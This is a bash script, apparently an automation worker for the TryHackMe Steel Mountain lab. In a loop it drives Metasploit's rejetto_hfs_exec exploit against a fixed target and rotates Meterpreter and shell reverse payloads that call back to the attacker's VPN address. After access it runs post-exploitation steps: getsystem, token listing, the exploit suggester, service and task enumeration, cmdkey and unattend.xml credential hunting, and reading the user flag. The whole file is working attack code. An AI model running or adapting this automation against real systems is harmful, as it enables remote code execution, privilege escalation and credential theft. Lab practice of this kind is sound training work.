#!/usr/bin/env bash
set -u

TARGET="10.146.141.173"
BLOG="/home/kali/Redteam-Hermes/docs/walkthroughs/THM/steel-mountain-live.md"
LOGDIR="/home/kali/Redteam-Hermes/logs"
LOG="$LOGDIR/steel_mountain_worker.log"
STATE_DIR="$LOGDIR/steel_state"
STUCK_FILE="$STATE_DIR/stuck_cycles"
mkdir -p "$LOGDIR" "$STATE_DIR"

TS() { date -u +"%Y-%m-%d %H:%M:%SZ"; }
log() { echo "[$(TS)] $*" | tee -a "$LOG"; }
blog_append() {
  {
    echo
    echo "### $(TS) — $1"
    shift
    for l in "$@"; do echo "$l"; done
  } >> "$BLOG"
}

get_attacker_ip() {
  local ip
  ip=$(ip -4 -o addr show dev tun0 2>/dev/null | awk '{print $4}' | cut -d/ -f1)
  [[ -z "$ip" ]] && ip=$(ip -4 -o addr show dev tun1 2>/dev/null | awk '{print $4}' | cut -d/ -f1)
  echo "$ip"
}

target_up() { curl -sI --max-time 8 "http://$TARGET:8080" | grep -q "HTTP/1.1"; }
single_tunnel_ok() {
  local c
  c=$(ip -br a | awk '/^tun[0-9]+[[:space:]]+UP/{c++} END{print c+0}')
  [[ "$c" -eq 1 ]]
}

next_method() {
  local n=0
  [[ -f "$STUCK_FILE" ]] && n=$(cat "$STUCK_FILE" 2>/dev/null || echo 0)
  n=$((n+1))
  echo "$n" > "$STUCK_FILE"
  echo $((n % 4))
}

reset_stuck() { echo 0 > "$STUCK_FILE"; }

session_cmds() {
  local sid="$1"
  local mode="$2"

  cat <<EOF
sessions -i $sid -C "getuid" --timeout 45
sessions -i $sid -C "sysinfo" --timeout 45
sessions -i $sid -C "shell -c whoami" --timeout 45
sessions -i $sid -C "shell -c whoami /priv" --timeout 45
EOF

  case "$mode" in
    0)
      cat <<EOF
sessions -i $sid -C "getsystem" --timeout 60
sessions -i $sid -C "load incognito" --timeout 45
sessions -i $sid -C "list_tokens -u" --timeout 45
EOF
      ;;
    1)
      cat <<EOF
sessions -i $sid -C "run post/multi/recon/local_exploit_suggester" --timeout 120
sessions -i $sid -C "run post/windows/gather/enum_system" --timeout 120
EOF
      ;;
    2)
      cat <<EOF
sessions -i $sid -C "shell -c sc query state^= all" --timeout 80
sessions -i $sid -C "shell -c schtasks /query /fo LIST /v" --timeout 90
EOF
      ;;
    3)
      cat <<EOF
sessions -i $sid -C "shell -c cmdkey /list" --timeout 60
sessions -i $sid -C "shell -c dir C:\\ /b /s *unattend*.xml" --timeout 90
sessions -i $sid -C "shell -c type C:\\Users\\bill\\Desktop\\user.txt" --timeout 45
EOF
      ;;
  esac
}

build_rc() {
  local lhost="$1" lport="$2" payload="$3" runlog="$4" mode="$5"
  {
    echo "spool $runlog"
    echo "use exploit/windows/http/rejetto_hfs_exec"
    echo "set RHOSTS $TARGET"
    echo "set RPORT 8080"
    echo "set LHOST $lhost"
    echo "set LPORT $lport"
    echo "set payload $payload"
    echo "run -j"
    echo "sleep 18"
    echo "sessions -l"
    for sid in 1 2 3 4 5 6 7 8; do
      session_cmds "$sid" "$mode"
    done
    echo "sessions -l"
    echo "spool off"
    echo "exit -y"
  } > /tmp/steel_mountain_hfs.rc
}

attempt_once() {
  local lhost="$1" lport="$2" payload="$3" mode="$4"
  local runlog="$STATE_DIR/msf_${lport}_$(date +%s).log"

  build_rc "$lhost" "$lport" "$payload" "$runlog" "$mode"
  msfconsole -q -r /tmp/steel_mountain_hfs.rc >> "$LOG" 2>&1 || true

  grep -Eqi "(NT AUTHORITY\\SYSTEM|getsystem:.*success|got system|is_system:\s*true)" "$runlog" && {
    log "privesc success: SYSTEM observed ($runlog)"
    touch "$STATE_DIR/system_observed"
    reset_stuck
    blog_append "Privilege escalation milestone" \
      "- SYSTEM-level context observed during automated methodology cycle." \
      "- Evidence log: $runlog"
    return 0
  }

  if grep -Eqi "Meterpreter session [0-9]+ opened|Command shell session [0-9]+ opened" "$runlog"; then
    log "foothold obtained; no SYSTEM yet (method=$mode, payload=$payload, lport=$lport)"
    return 0
  fi

  return 1
}

log "worker supervisor start (methodology-driven foothold+privesc)"

while true; do
  if ! single_tunnel_ok; then log "blocked: tunnel count != 1; waiting"; sleep 30; continue; fi

  ATTACKER_IP=$(get_attacker_ip)
  if [[ -z "$ATTACKER_IP" ]]; then log "blocked: no tun interface IP; retry in 45s"; sleep 45; continue; fi
  if ! target_up; then log "target 8080 not reachable; retry in 45s"; sleep 45; continue; fi

  mode=$(next_method)
  case "$mode" in
    0) log "method pivot: token/SYSTEM path (Windows methodology phase 4)" ;;
    1) log "method pivot: exploit-suggester + system enum path" ;;
    2) log "method pivot: services/tasks misconfig path" ;;
    3) log "method pivot: credentials/secrets path" ;;
  esac

  log "starting attempt cycle from $ATTACKER_IP"
  nmap -Pn -n -p8080 -sV "$TARGET" >> "$LOG" 2>&1 || true

  success=0
  for lport in 4444 5555 9001; do
    for payload in windows/meterpreter/reverse_tcp windows/meterpreter/reverse_http windows/shell/reverse_tcp; do
      if attempt_once "$ATTACKER_IP" "$lport" "$payload" "$mode"; then success=1; break 2; fi
      sleep 3
    done
  done

  if [[ -f "$STATE_DIR/system_observed" ]]; then
    log "SYSTEM already observed; slowing loop"
    sleep 180
  elif [[ "$success" -eq 1 ]]; then
    log "foothold present; continuing with next methodology branch"
    sleep 70
  else
    log "no foothold this cycle; backoff 90s"
    sleep 90
  fi
done
